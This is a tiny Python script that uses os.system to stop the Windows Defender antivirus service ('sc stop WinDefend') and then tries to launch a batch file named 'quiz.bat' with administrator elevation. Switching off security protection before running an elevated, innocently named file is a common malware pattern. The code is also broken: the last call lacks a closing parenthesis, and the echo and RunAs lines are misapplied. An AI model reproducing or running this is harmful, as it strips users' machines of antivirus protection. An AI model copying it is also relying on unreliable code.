import os, sys
os.system("@echo off")
os.system("sc stop WinDefend")
os.system("quiz.bat -verb RunAs"